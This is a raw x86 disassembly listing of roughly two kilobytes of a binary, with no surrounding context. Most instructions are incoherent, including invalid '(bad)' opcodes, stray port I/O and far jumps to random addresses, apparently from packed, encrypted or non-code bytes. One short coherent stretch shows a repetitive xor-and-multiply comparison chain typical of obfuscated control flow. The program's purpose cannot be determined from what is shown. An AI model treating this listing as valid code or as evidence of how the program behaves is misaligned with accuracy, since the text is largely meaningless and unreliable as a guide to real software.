  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403ac8
  403ad7:	ins    DWORD PTR es:[edi],dx
  403ad8:	mov    ds:0xd948052e,al
  403add:	psrld  mm7,QWORD PTR [ebx+0x3d5000d4]
  403ae4:	ror    BYTE PTR [esi],1
  403ae6:	jp     0x403b13
  403ae8:	mov    eax,0x39959704
  403aed:	add    bl,BYTE PTR [edx+0x1c]
  403af0:	sub    eax,0x5cc83cd1
  403af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403af6:	mov    ecx,0x72f24e59
  403afb:	ja     0x403b0d
  403afd:	xchg   ecx,eax
  403afe:	add    edx,DWORD PTR [ebp-0x15c65c94]
  403b04:	pop    ecx
  403b05:	push   ds
  403b06:	push   ebx
  403b07:	in     al,0x34
  403b09:	dec    ebx
  403b0a:	sbb    ah,BYTE PTR [ebx-0x633d86b9]
  403b10:	sub    edi,DWORD PTR [ecx-0xcc4d070]
  403b16:	into   
  403b17:	mov    dh,0x70
  403b19:	into   
  403b1a:	mov    esi,0xd903b8d0
  403b1f:	mul    DWORD PTR [eax]
  403b21:	push   edx
  403b22:	retf   0xfeae
  403b25:	xor    eax,DWORD PTR [edx]
  403b27:	jp     0x403ac3
  403b29:	nop
  403b2a:	inc    esi
  403b2b:	xor    DWORD PTR [esi+0x5de05f6c],esp
  403b31:	adc    ecx,ebp
  403b33:	retf   
  403b34:	cwde   
  403b35:	outs   dx,DWORD PTR ds:[esi]
  403b36:	xchg   edi,eax
  403b37:	sbb    eax,0x1bc52d60
  403b3c:	jne    0x403b46
  403b3e:	out    dx,eax
  403b3f:	sub    ecx,edi
  403b41:	mov    eax,ds:0x64ec9f81
  403b46:	add    ah,bl
  403b48:	jo     0x403b1b
  403b4a:	jp     0x403b73
  403b4c:	aam    0xfa
  403b4e:	dec    ecx
  403b4f:	xchg   ecx,eax
  403b50:	xchg   DWORD PTR [ebx-0x1b],eax
  403b53:	xchg   edi,eax
  403b54:	dec    edi
  403b55:	stos   BYTE PTR es:[edi],al
  403b56:	aaa    
  403b57:	push   ebx
  403b58:	leave  
  403b59:	push   eax
  403b5a:	imul   esp,DWORD PTR [edx-0x18ffad74],0xffffff81
  403b61:	ret    
  403b62:	fs loopne 0x403b99
  403b65:	scas   al,BYTE PTR es:[edi]
  403b66:	and    al,0x67
  403b68:	loop   0x403b95
  403b6a:	push   0x34e798d3
  403b6f:	ror    DWORD PTR [eax-0x2c152bf5],0x43
  403b76:	stos   BYTE PTR es:[edi],al
  403b77:	xchg   ecx,eax
  403b78:	stos   DWORD PTR es:[edi],eax
  403b79:	ins    DWORD PTR es:[edi],dx
  403b7a:	mov    al,ds:0xdbad0c50
  403b7f:	dec    ebx
  403b80:	imul   dl
  403b82:	push   esp
  403b83:	je     0x403b4b
  403b85:	dec    ebp
  403b86:	(bad)  [edx+esi*8-0x4]
  403b8a:	shl    bl,1
  403b8c:	mov    cl,0x55
  403b8e:	add    DWORD PTR [edi-0x3],ebp
  403b91:	xor    ebp,DWORD PTR [ecx+0x4e]
  403b94:	xlat   BYTE PTR ds:[ebx]
  403b95:	sub    ebp,DWORD PTR [eax-0x57]
  403b98:	mov    esi,0x71234c0f
  403b9d:	jge    0x403b29
  403b9f:	lahf   
  403ba0:	hlt    
  403ba1:	repz (bad) 
  403ba3:	mov    ebx,0xd592f6db
  403ba8:	add    dh,BYTE PTR [edi+0x2]
  403bab:	test   al,0xb4
  403bad:	mov    bl,0x5d
  403baf:	jno    0x403bd5
  403bb1:	add    ebx,ecx
  403bb3:	xchg   cl,cl
  403bb5:	mov    dh,0x3f
  403bb7:	les    esi,FWORD PTR [eax-0x9]
  403bba:	mov    dl,0x60
  403bbc:	imul   esp,DWORD PTR [edi],0x25
  403bbf:	xchg   edx,eax
  403bc0:	xlat   BYTE PTR ds:[ebx]
  403bc1:	test   BYTE PTR [ebp+edi*8+0x24a4011d],0x8b
  403bc9:	mov    eax,ds:0xf4b27dbc
  403bce:	dec    ebx
  403bcf:	(bad)  
  403bd0:	stc    
  403bd1:	lock xor bl,BYTE PTR [ecx+0x2bdf9616]
  403bd8:	fs push edx
  403bda:	jae    0x403bd0
  403bdc:	inc    ebx
  403bde:	xor    dh,0x8c
  403be1:	outs   dx,DWORD PTR ds:[esi]
  403be2:	mov    cl,0x79
  403be4:	pop    ds
  403be5:	add    al,0x5e
  403be7:	mov    ?,WORD PTR [esp+ecx*1]
  403bea:	mov    cl,0x40
  403bec:	adc    ecx,DWORD PTR [ebp+0x56]
  403bef:	inc    ecx
  403bf0:	stos   BYTE PTR es:[edi],al
  403bf1:	mov    ds:0xfac91ebf,al
  403bf6:	popa   
  403bf7:	add    al,0x59
  403bf9:	aam    0xde
  403bfb:	lock arpl bp,di
  403bfe:	rcl    BYTE PTR [esp+ecx*8],cl
  403c01:	std    
  403c02:	and    DWORD PTR [eax+0x3f815bc0],esp
  403c08:	adc    ecx,edx
  403c0a:	xor    eax,0xed25aabd
  403c0f:	xor    BYTE PTR [edx-0x72],bl
  403c12:	mov    esp,0xb30f71aa
  403c17:	adc    DWORD PTR [eax+0x39],0x2c
  403c1b:	popf   
  403c1c:	mov    ebp,0x20e527ff
  403c21:	fldenv [ebx]
  403c23:	xor    ah,BYTE PTR [ecx-0x1b522c27]
  403c29:	mov    ch,0xa2
  403c2b:	sub    BYTE PTR [eax+eax*4+0x2e],ch
  403c2f:	cmp    DWORD PTR [ebx-0x5429c54a],esp
  403c35:	sbb    ebp,DWORD PTR [esi]
  403c37:	mov    esp,0x2e53fc7e
  403c3c:	pop    esi
  403c3d:	dec    esi
  403c3e:	outs   dx,BYTE PTR ds:[esi]
  403c3f:	jl     0x403c9b
  403c41:	imul   esp,DWORD PTR [edx-0x3d],0xffffff95
  403c45:	je     0x403c63
  403c47:	or     eax,0xa76f9e80
  403c4c:	add    DWORD PTR [esp+eax*8-0x7d],0x1d
  403c51:	(bad)  
  403c52:	fisub  WORD PTR [esi]
  403c54:	outs   dx,DWORD PTR ds:[esi]
  403c55:	icebp  
  403c56:	cmp    ecx,edi
  403c58:	xor    eax,0x60dfb027
  403c5d:	mov    ebp,0x1011e426
  403c62:	mov    fs,WORD PTR ds:0xf6e6461a
  403c68:	add    dh,BYTE PTR [edi-0x49]
  403c6b:	jns    0x403cc8
  403c6d:	xor    ah,BYTE PTR [eax-0x4765715c]
  403c73:	sbb    al,0x38
  403c75:	neg    DWORD PTR ds:0x470f7297
  403c7b:	xchg   DWORD PTR [eax-0x431d6133],ecx
  403c81:	addr16 call 0x70ce:0x9b03471b
  403c89:	fdiv   DWORD PTR [ebx+0x7d]
  403c8c:	dec    ebp
  403c8d:	jnp    0x403c64
  403c8f:	(bad)  
  403c90:	pop    edx
  403c91:	mov    ebx,DWORD PTR [esi-0x1e03f7ec]
  403c97:	scas   eax,DWORD PTR es:[edi]
  403c98:	scas   eax,DWORD PTR es:[edi]
  403c99:	sub    ah,ah
  403c9b:	in     eax,dx
  403c9c:	inc    esi
  403c9d:	inc    edi
  403c9e:	and    al,0x81
  403ca0:	(bad)  
  403ca1:	dec    ebp
  403ca2:	jb     0x403c9f
  403ca4:	xchg   esi,eax
  403ca5:	repz pop ebx
  403ca7:	mov    dl,0xfb
  403ca9:	aam    0xf
  403cab:	push   edi
  403cac:	imul   edx,DWORD PTR [edi],0xa6d9b97f
  403cb2:	mov    ds:0x2a46b293,al
  403cb7:	mov    bl,0x88
  403cb9:	stc    
  403cba:	sub    al,0xb0
  403cbc:	xchg   edx,eax
  403cbd:	or     DWORD PTR [eax+ecx*4+0x43aed83a],eax
  403cc4:	adc    DWORD PTR [ebx-0x5c],esi
  403cc7:	out    0x74,eax
  403cc9:	mov    ebx,0xb1e308bc
  403cce:	ins    DWORD PTR es:[edi],dx
  403ccf:	mov    WORD PTR ds:0xaba4fe4,fs
  403cd5:	enter  0xd802,0x1f
  403cd9:	jae    0x403d44
  403cdb:	pop    es
  403cdc:	inc    ebp
  403cdd:	sub    eax,0x3419ba5c
  403ce2:	mov    ah,0xc7
  403ce4:	retf   0xe141
  403ce7:	ins    BYTE PTR es:[edi],dx
  403ce8:	fadd   QWORD PTR [ebp-0x11]
  403ceb:	add    esi,DWORD PTR [esi]
  403ced:	or     ebx,ebx
  403cef:	cdq    
  403cf0:	push   edx
  403cf1:	pop    esp
  403cf2:	into   
  403cf3:	push   esp
  403cf4:	and    esi,DWORD PTR [ecx]
  403cf6:	sub    al,0x89
  403cf8:	les    edi,FWORD PTR [edx+0x16]
  403cfb:	add    ch,bl
  403cfd:	dec    edi
  403cfe:	scas   al,BYTE PTR es:[edi]
  403cff:	mov    ?,WORD PTR [esi-0x35]
  403d02:	xchg   esi,edx
  403d04:	ins    DWORD PTR es:[edi],dx
  403d05:	ret    
  403d06:	push   esp
  403d07:	jb     0x403d21
  403d09:	lds    edx,FWORD PTR [edx+0xd900aaa]
  403d0f:	retf   
  403d10:	add    eax,0x25e73661
  403d15:	cs dec esp
  403d17:	dec    ecx
  403d18:	call   DWORD PTR [ebx]
  403d1a:	popf   
  403d1b:	mov    edi,0xf2750d51
  403d20:	icebp  
  403d21:	xchg   ecx,eax
  403d22:	mov    esi,0xa2ba8c6c
  403d27:	push   ecx
  403d28:	in     eax,0xd4
  403d2a:	jg     0x403cd0
  403d2c:	pop    edx
  403d2d:	fistp  WORD PTR [eax+0x70af4baa]
  403d33:	jmp    0xc552:0xf383cf02
  403d3a:	xlat   BYTE PTR ds:[ebx]
  403d3b:	pop    esi
  403d3c:	dec    ebx
  403d3d:	cs out 0xa7,eax
  403d40:	inc    ecx
  403d41:	jle    0x403d71
  403d43:	push   ebx
  403d44:	push   0xab1c72da
  403d49:	ret    0xd8d8
  403d4c:	sbb    eax,0xd04301f1
  403d51:	mov    esi,0x68c13012
  403d56:	mul    DWORD PTR [edx+0x4f9d5494]
  403d5c:	jb     0x403d1c
  403d5e:	sbb    ebx,DWORD PTR [ebp-0x525b083b]
  403d64:	jp     0x403d55
  403d66:	in     eax,dx
  403d67:	daa    
  403d68:	into   
  403d69:	mov    dh,0x4d
  403d6b:	aaa    
  403d6c:	push   ebp
  403d6d:	fist   WORD PTR [ebp+0x51]
  403d70:	int    0x50
  403d72:	adc    eax,DWORD PTR [eax+0x33]
  403d75:	aaa    
  403d76:	pop    ss
  403d77:	stos   DWORD PTR es:[edi],eax
  403d78:	push   ebp
  403d79:	jae    0x403dbc
  403d7b:	adc    al,0x4f
  403d7d:	sbb    DWORD PTR [edx-0x70],esp
  403d80:	test   BYTE PTR [ecx],cl
  403d82:	push   ebx
  403d83:	pop    esi
  403d84:	xor    edi,ebp
  403d86:	cmc    
  403d87:	leave  
  403d88:	push   cs
  403d89:	jae    0x403d62
  403d8b:	sti    
  403d8c:	push   ebx
  403d8d:	adc    ebx,eax
  403d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d90:	dec    esp
  403d91:	aad    0x55
  403d93:	cmp    edi,DWORD PTR [ecx+0x5b3c0441]
  403d99:	cdq    
  403d9a:	hlt    
  403d9b:	sahf   
  403d9c:	rcr    DWORD PTR [eax+0x18196d9d],cl
  403da2:	jmp    0x403e23
  403da4:	cmp    dh,BYTE PTR [edi-0x4021afe7]
  403daa:	rcr    edx,cl
  403dac:	cmp    BYTE PTR [esi+0x31],bl
  403daf:	lds    ecx,FWORD PTR [ecx+ecx*2+0x5]
  403db3:	or     edx,DWORD PTR [esi]
  403db5:	inc    ebp
  403db6:	and    BYTE PTR [edi],dh
  403db8:	xor    BYTE PTR [esi],bl
  403dba:	fxch   st(4)
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffd3
  403e75:	adc    esp,DWORD PTR [edi+edi*4]
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e8b
  403e81:	test   DWORD PTR [ebp-0x2503da5],0xf3d277f6
  403e8b:	push   ebp
  403e8c:	pop    ecx
  403e8d:	arpl   WORD PTR [ebx+0x4e62676c],bp
  403e93:	adc    eax,0xbaf88d2f
  403e98:	mov    ds:0x82be8bcd,al
  403e9d:	cdq    
  403e9e:	sbb    cl,BYTE PTR ds:0xf477827c
  403ea4:	or     DWORD PTR [edx-0x43b2d218],esp
  403eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eab:	sti    
  403eac:	xor    BYTE PTR [edi],al
  403eae:	mov    esi,ebp
  403eb0:	fwait
  403eb1:	scas   eax,DWORD PTR es:[edi]
  403eb2:	test   eax,0xcada10ca
  403eb7:	xor    esi,ebp
  403eb9:	pop    edx
  403eba:	arpl   WORD PTR [ecx],ax
  403ebc:	sub    al,0x2a
  403ebe:	scas   eax,DWORD PTR es:[edi]
  403ebf:	cmp    eax,0x33c7e52b
  403ec4:	cmp    al,0x4a
  403ec6:	popf   
  403ec7:	and    eax,0x65c07ab2
  403ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ecd:	jle    0x403f22
  403ecf:	xchg   DWORD PTR [esi],eax
  403ed1:	mov    dh,0x8b
  403ed3:	sbb    DWORD PTR [eax-0x3b],0xffffffb5
  403ed7:	fiadd  WORD PTR [ecx-0x6f339272]
  403edd:	push   esi
  403ede:	ins    BYTE PTR es:[edi],dx
  403edf:	(bad)  
  403ee1:	in     al,0x91
  403ee3:	(bad)  
  403ee4:	les    ecx,FWORD PTR [ecx+0x68]
  403ee7:	push   0x7f
  403ee9:	int    0x9c
  403eeb:	inc    ebp
  403eec:	jne    0x403e6e
  403eee:	push   ebx
  403eef:	cmp    BYTE PTR [edx+0x14],ch
  403ef2:	(bad)  
  403ef3:	jno    0x403f4d
  403ef5:	bound  edi,QWORD PTR [ebx]
  403ef7:	aam    0xdd
  403ef9:	mov    eax,0xb47b7e52
  403efe:	pop    eax
  403eff:	jp     0x403f05
  403f01:	xchg   ebp,eax
  403f02:	pop    esp
  403f03:	cmp    edi,DWORD PTR [ecx-0xf]
  403f06:	inc    esp
  403f07:	push   esi
  403f08:	adc    ch,BYTE PTR ds:0xfcdf959e
  403f0e:	xchg   esp,eax
  403f0f:	lahf   
  403f10:	mov    cl,0x7d
  403f12:	and    al,0x83
  403f14:	dec    esi
  403f15:	stos   DWORD PTR es:[edi],eax
  403f16:	pop    ss
  403f17:	xor    BYTE PTR [esp+ebp*1],cl
  403f1a:	mov    BYTE PTR [edi+0x64],ch
  403f1d:	pop    eax
  403f1e:	sbb    ebp,ebx
  403f20:	test   eax,0x769fcbfe
  403f25:	shl    BYTE PTR [edx-0x5b7fb951],0xde
  403f2c:	cmp    cl,BYTE PTR gs:[ebp+eax*4-0x7c]
  403f31:	dec    edx
  403f32:	loope  0x403f76
  403f34:	fisubr WORD PTR [ebp-0x5d]
  403f37:	je     0x403f1a
  403f39:	out    0xc6,eax
  403f3b:	xor    ecx,edx
  403f3d:	ret    
  403f3e:	enter  0x9f5a,0x61
  403f42:	adc    cl,BYTE PTR [ebp-0x2329a94d]
  403f48:	xchg   edi,eax
  403f49:	jb     0x403ee8
  403f4b:	loope  0x403fb5
  403f4d:	push   eax
  403f4e:	das    
  403f4f:	pop    ds
  403f50:	out    0xf6,al
  403f52:	into   
  403f53:	icebp  
  403f54:	mov    cl,0x27
  403f56:	dec    ebx
  403f57:	fimul  DWORD PTR [ebx]
  403f59:	enter  0xba8f,0x8d
  403f5d:	aad    0xa7
  403f5f:	rol    DWORD PTR [edx-0x66499b57],1
  403f65:	ror    DWORD PTR [ebp-0x80],1
  403f68:	mov    dl,0x61
  403f6a:	mov    BYTE PTR [ebp+0xfe39223],bl
  403f70:	or     DWORD PTR [ebp+edi*2+0x3b],edx
  403f74:	mov    eax,ds:0xbf145b72
  403f79:	lods   al,BYTE PTR ds:[esi]
  403f7a:	sub    dl,BYTE PTR [ebx]
  403f7c:	lahf   
  403f7d:	in     al,0x53
  403f7f:	mov    eax,ds:0x9447b455
  403f84:	cs clc 
  403f86:	push   0x78a8960d
  403f8b:	mov    eax,0x6b44c3ae
  403f90:	xlat   BYTE PTR ds:[ebx]
  403f91:	fcomp  DWORD PTR [ebp-0x4ddfe9b1]
  403f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f98:	push   eax
  403f99:	shr    DWORD PTR ds:0x88495e6,0x7a
  403fa0:	sub    BYTE PTR [ecx+edx*1+0x61],ch
  403fa4:	pop    ebx
  403fa5:	xchg   ebx,eax
  403fa6:	mov    eax,0xb3be0c8b
  403fab:	bound  ebp,QWORD PTR ss:[edi+eiz*4-0x6f5ac4d3]
  403fb3:	push   cs
  403fb4:	and    eax,edx
  403fb6:	xor    BYTE PTR [ebx-0x4793f060],ah
  403fbc:	cmp    eax,eax
  403fbe:	retf   
  403fbf:	and    ecx,DWORD PTR [edi+0x2a]
  403fc2:	mov    esi,0xd2ccf2e4
  403fc7:	repz adc eax,DWORD PTR [esi]
  403fca:	out    0x6a,eax
  403fcc:	xor    dl,BYTE PTR [ebx]
  403fce:	mov    edx,0xc27f16a1
  403fd3:	inc    edx
  403fd4:	jg     0x403fe1
  403fd6:	jns    0x403f92
  403fd8:	add    eax,0xac63bac1
  403fdd:	(bad)  
  403fde:	ds (bad) 
  403fe0:	retf   
  403fe1:	sti    
  403fe2:	mov    ebx,0x7db8cc72
  403fe7:	test   eax,0x5ceba904
  403fec:	dec    eax
  403fed:	sub    esp,DWORD PTR fs:[ebp+0xa]
  403ff1:	xchg   BYTE PTR [edi+edx*4],ah
  403ff4:	test   ch,cl
  403ff6:	jg     0x403fea
  403ff8:	loopne 0x403fb1
  403ffa:	mov    edi,0x3c1cdb80
  403fff:	xor    bl,0xf0
  404002:	pusha  
  404003:	push   eax
  404004:	adc    esp,esi
  404006:	test   BYTE PTR [eax],0x90
  404009:	bound  ecx,QWORD PTR [edi+ecx*8]
  40400c:	pop    ebx
  40400d:	out    0xd2,eax
  40400f:	xor    BYTE PTR [esi],ch
  404011:	sub    ecx,DWORD PTR [ebx-0x4d49ed8d]
  404017:	mov    DWORD PTR [edi+ecx*4-0x24],esp
  40401b:	out    dx,al
  40401c:	push   edi
  40401d:	out    0xff,al
  40401f:	mov    esi,0x415a5b17
  404024:	dec    edx
  404025:	dec    edx
  404026:	sbb    al,0x50
  404028:	sbb    dl,BYTE PTR [ebx+0x9b009f1]
  40402e:	push   ebx
  40402f:	in     al,0x8
  404031:	xor    cl,BYTE PTR [eax+eiz*8+0xfad96e3]
  404038:	shr    eax,0xa2
  40403b:	aad    0x80
  40403d:	pop    edi
  40403e:	or     BYTE PTR [edx-0x363d7ff2],0xf0
  404045:	pop    edi
  404046:	xchg   BYTE PTR [ebx+0x15cdf7ce],cl
  40404c:	jbe    0x4040ab
  40404e:	xchg   ecx,eax
  40404f:	mov    bl,0x41
  404051:	pop    edx
  404052:	cdq    
  404053:	pop    ecx
  404054:	pop    ebp
  404055:	sub    eax,DWORD PTR [edi+0x5429d3c]
  40405b:	pop    esi
  40405c:	xchg   al,dl
  40405e:	add    DWORD PTR [eax-0x7993eab4],ecx
  404064:	inc    esi
  404065:	push   eax
  404066:	add    eax,DWORD PTR [ebx]
  404068:	mov    bh,0x39
  40406a:	jnp    0x404042
  40406c:	es push ss
  40406e:	pop    ebx
  40406f:	mov    dh,0x49
  404071:	pop    ecx
  404072:	inc    esi
  404073:	inc    edx
  404074:	jae    0x404016
  404076:	dec    ecx
  404077:	bt     DWORD PTR [edi+ecx*4+0x119146a5],esi
  40407f:	mov    eax,ds:0x1ad23dff
  404084:	das    
  404085:	cdq    
  404086:	cmp    eax,0x641f3e8e
  40408b:	pop    esp
  40408c:	popa   
  40408d:	popf   
  40408e:	jae    0x40402d
  404090:	mov    al,ds:0xc655bf1a
  404095:	cmp    ecx,DWORD PTR [edi*1+0x75f600e5]
  40409c:	xchg   ecx,eax
  40409d:	clc    
  40409e:	dec    esp
  40409f:	cld    
  4040a0:	push   ecx
  4040a1:	scas   eax,DWORD PTR es:[edi]
  4040a2:	out    0x22,al
  4040a4:	outs   dx,DWORD PTR ds:[esi]
  4040a5:	xchg   ecx,eax
  4040a6:	pop    edi
  4040a7:	xchg   edx,eax
  4040a8:	test   cl,bl
  4040aa:	stc    
  4040ab:	hlt    
  4040ac:	xor    DWORD PTR [edi],0xffffffa6
  4040af:	inc    esp
  4040b0:	xchg   ecx,eax
  4040b1:	int    0xc4
  4040b3:	add    al,0x3a
  4040b5:	sti    
  4040b6:	jecxz  0x4040bd
  4040b8:	sbb    dh,BYTE PTR [ecx+0x2e]
  4040bb:	sbb    BYTE PTR [ebx+0x16],dl
  4040be:	mov    WORD PTR [ecx+ecx*8],cs
  4040c1:	dec    eax
  4040c2:	or     BYTE PTR [edx+0x5d],ah
  4040c5:	rcl    DWORD PTR [edi+0x23],cl
  4040c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040ca:	lea    esp,[ebx-0x7087698]
  4040d0:	sti    
  4040d1:	scas   eax,DWORD PTR es:[edi]
  4040d2:	lods   al,BYTE PTR ds:[esi]
  4040d3:	jmp    0x404099
  4040d5:	aam    0x3b
  4040d7:	jge    0x4040c2
  4040d9:	mov    edi,0x613a3105
  4040de:	xor    DWORD PTR [eax+0x532a3653],ebx
  4040e4:	inc    esp
  4040e5:	inc    ebx
  4040e6:	adc    esp,DWORD PTR [esi-0x773c4fdb]
  4040ec:	push   ebx
  4040ed:	mov    esp,0x986c8a2b
  4040f2:	(bad)  
  4040f3:	ins    DWORD PTR es:[edi],dx
  4040f4:	add    al,0xca
  4040f6:	push   0x30c0c6ae
  4040fb:	mov    edx,0xf80556c
  404100:	out    0x3,al
  404102:	outs   dx,DWORD PTR ds:[esi]
  404103:	pop    ss
  404104:	fist   WORD PTR [ebx]
  404106:	(bad)
  404109:	and    ch,BYTE PTR [ecx]
  40410b:	jmp    0xf6f75586
  404110:	scas   eax,DWORD PTR es:[edi]
  404111:	shl    DWORD PTR [edi],1
  404113:	cmp    eax,0x17efcd8
  404118:	pop    ecx
  404119:	div    BYTE PTR [ecx+0x2e254943]
  40411f:	xchg   esp,eax
  404120:	mov    WORD PTR [edi],fs
  404122:	outs   dx,BYTE PTR ds:[esi]
  404123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404124:	pop    eax
  404125:	scas   eax,DWORD PTR es:[edi]
  404126:	mov    esi,0x15cab3f1
  40412b:	push   edi
  40412c:	shr    DWORD PTR [esi+esi*2],cl
  40412f:	arpl   di,cx
  404131:	sbb    bl,0x75
  404134:	or     ax,0x199b
  404138:	in     al,dx
  404139:	das    
  40413a:	pop    ebx
  40413b:	jge    0x4040ec
  40413d:	fnstcw WORD PTR [esi+0x3d]
  404140:	(bad)  
  404142:	pop    edx
  404143:	cmp    ebx,DWORD PTR [eax-0xf0bd96f]
  404149:	in     eax,dx
  40414a:	test   BYTE PTR [ecx+0x50443634],dl
  404150:	xchg   ax,ax
  404152:	jmp    0x7e80e1a6
  404157:	lea    edx,[edx]
  404159:	sub    eax,0xc15bd0c8
  40415e:	push   es
  40415f:	dec    edi
  404160:	sbb    DWORD PTR [edx-0x4b],edx
  404163:	fs inc eax
  404165:	add    ch,BYTE PTR [ebx]
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edx+0x744442c3],dl
  40418f:	sbb    eax,0x7c587e7e
  404194:	jle    0x404214
  404196:	aam    0x8f
  404198:	jg     0x40411f
  40419a:	mov    ch,0x8b
  40419c:	xor    DWORD PTR [esi-0x5ba6a834],edx
  4041a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041a3:	cmp    BYTE PTR [ebx],cl
  4041a5:	es jmp 0xd266:0x6f9a8838
  4041ad:	int    0xb6
  4041af:	fbld   TBYTE PTR [eax+0x30]
  4041b2:	xlat   BYTE PTR ds:[ebx]
  4041b3:	sbb    BYTE PTR [edi],ah
  4041b5:	push   edi
  4041b6:	icebp  
  4041b7:	add    edi,esp
  4041b9:	mov    dl,0xf7
  4041bb:	js     0x4041fa
  4041bd:	dec    ebx
  4041be:	xchg   DWORD PTR [eax],ebx
  4041c0:	dec    ebp
  4041c1:	in     eax,0x5c
  4041c3:	mov    DWORD PTR [esi-0x7a],ebp
  4041c6:	pop    es
  4041c7:	jge    0x40418c
  4041c9:	jge    0x404205
  4041cb:	idiv   DWORD PTR ds:[eax-0x1b]
  4041cf:	mov    ebx,0xf040c9b3
  4041d4:	ret    0xecfd
  4041d7:	sub    eax,0x95aad51b
  4041dc:	xor    al,0xbd
  4041de:	sbb    eax,0x1b662b6c
  4041e3:	mov    eax,0xfdd1afd1
  4041e8:	jmp    0x404225
  4041ea:	aaa    
  4041eb:	inc    ebx
  4041ec:	out    dx,al
  4041ed:	outs   dx,DWORD PTR ds:[esi]
  4041ee:	and    eax,0xef623ec3
  4041f3:	jo     0x4041b1
  4041f5:	sbb    bh,cl
  4041f7:	clc    
  4041f8:	mov    dh,0x7c
  4041fa:	and    eax,0xbbe70986
  4041ff:	stos   DWORD PTR es:[edi],eax
  404200:	sti    
  404201:	mov    es:0x3dde818e,al
  404207:	pop    eax
  404208:	ins    DWORD PTR es:[edi],dx
  404209:	jge    0x4041ff
  40420b:	imul   ebx,DWORD PTR [ecx-0x5563185e],0x27
  404212:	cmp    BYTE PTR [edi],cl
  404214:	cmp    DWORD PTR [edx+ebp*8],ecx
  404217:	outs   dx,BYTE PTR ds:[esi]
  404218:	fwait
  404219:	xchg   cl,bl
  40421b:	nop
  40421c:	jae    0x4041af
  40421e:	jle    0x404239
  404220:	mov    dl,0x16
  404222:	into   
  404223:	jb     0x40429d
  404225:	sbb    bl,BYTE PTR [ecx-0x3a35f97a]
  40422b:	dec    edx
  40422c:	jp     0x4041db
  40422e:	inc    ch
  404230:	mov    eax,ds:0x55d62698
  404235:	push   es
  404236:	sub    BYTE PTR [ebx],dh
  404238:	shl    BYTE PTR [edx-0x29],1
  40423b:	mov    fs:0xb6ef0196,al
  404241:	popa   
  404242:	dec    ebp
  404243:	cmp    al,0x7d
  404245:	add    eax,0xddabbbb0
  40424a:	push   cs
  40424b:	and    esi,DWORD PTR [esi]
  40424d:	(bad)  
  40424e:	or     eax,0xb34589d7
  404253:	daa    
  404254:	(bad)  
  404255:	jle    0x4041e7
  404257:	push   cs
  404258:	dec    ebx
  404259:	mul    BYTE PTR [edi-0x18]
  40425c:	sar    ah,cl
  40425e:	jno    0x40429d
  404260:	sub    esp,DWORD PTR [edx+0x52a99ae6]
